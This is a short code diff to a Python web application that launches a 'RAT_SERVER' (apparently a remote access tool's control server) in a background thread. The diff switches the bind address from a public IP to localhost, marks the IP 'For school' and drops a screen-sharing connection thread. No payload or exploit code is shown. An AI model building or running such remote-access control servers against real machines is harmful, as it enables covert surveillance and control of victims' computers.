@@ -17,22 +17,19 @@ app.add_middleware(
 
 
 def start_rat_server():
-    rat = RAT_SERVER('158.149.96.13', 4444)
+    # For school: 158.149.96.13
+    rat = RAT_SERVER('localhost', 4444)
 
-    # Start in another thread
     try:
-        rat_thread = threading.Thread(target=rat.build_screenshare_connection)
-        rat_thread.start()
-
-        rat_connectionThread = threading.Thread(target=rat.build_connection)
-        rat_connectionThread.start()
+        main = threading.Thread(target=rat.build_connection)
+        main.start()
     except Exception as e:
         print(e)
         print("Error starting RAT server")
 
 
-rat_thread = threading.Thread(target=start_rat_server)
-rat_thread.start()
+rat_server = threading.Thread(target=start_rat_server)
+rat_server.start()
 
 app.include_router(user.app, prefix="/api/v1")
 app.include_router(clients.app, prefix="/api/v1")
